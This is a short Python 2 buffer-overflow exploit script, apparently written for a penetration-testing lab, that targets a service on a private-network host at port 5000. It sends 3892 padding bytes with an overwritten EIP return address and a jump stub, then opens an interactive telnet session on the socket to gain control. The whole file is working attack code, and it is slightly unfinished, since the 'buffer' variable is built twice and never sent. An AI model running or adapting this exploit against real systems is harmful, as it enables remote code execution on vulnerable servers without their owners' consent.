#!/usr/bin/python
import socket
import sys
import time
import telnetlib

host = "192.168.246.52"
port = 5000


crash = "\x41" * 3892 # 4368
eip = "\x2b\x86\x04\x08"
first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"

buffer = "\x11(setup sound " + crash + eip + first_stage + "\x90\x00#"

buffer = crash + eip + first_stage

def interact(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


try:
#f = open("exploit.txt", 'wb')
#f.write(crash)
#f.close()
    print("Sending buffer.....")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    print s.recv(1024)
    s.send(crash + eip + '\n')
    print s.recv(2000)
    interact(s)
    s.close()
except:
    print("Unable to connect to " + host + " on port " + str(port))
    sys.exit()

sys.exit()

